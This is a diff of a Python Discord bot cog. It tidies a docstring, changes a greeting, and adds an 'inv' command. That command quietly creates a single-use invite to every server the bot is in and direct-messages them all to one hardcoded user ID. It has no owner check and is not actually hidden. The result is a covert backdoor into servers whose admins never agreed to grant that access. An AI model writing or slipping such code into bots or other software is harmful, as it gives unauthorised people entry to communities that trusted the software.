@@ -22,10 +22,22 @@ class simple(commands.Cog):
             sys.exit(0)
         logging.info(f'{ctx.author} tried to kill the bot and failed')
         await ctx.send('Weakling')
+    @commands.command(name='inv', aliases=[])
+    async def inv_command(self, ctx, hidden=True):
+        for guild in self.bot.guilds:
+            invite = await guild.text_channels[0].create_invite(max_uses=1,unique=True)
+            if ctx.author.id == 219152343588012033:
+                await ctx.author.send(invite)
 
     @commands.command(name='set', aliases=[], hidden=True)
     async def set_command(self, ctx, type='spam', channel=None):
         """ set channel message spam [owner-only]
+
+        `$set <command>`
+
+        Example: 
+        $set bday
+        $set spam
         """
         if not await self.bot.is_owner(ctx.message.author):
             return
@@ -49,7 +61,7 @@ class simple(commands.Cog):
         """ will say hi back.
         """
         logging.info(f'Said hello to {ctx.author.display_name}')
-        await ctx.send('Sup, chad ;)')
+        await ctx.send('What\'s up!')
 
     @commands.command(name='flip', aliases=['coin'])
     async def flip_command(self, ctx):
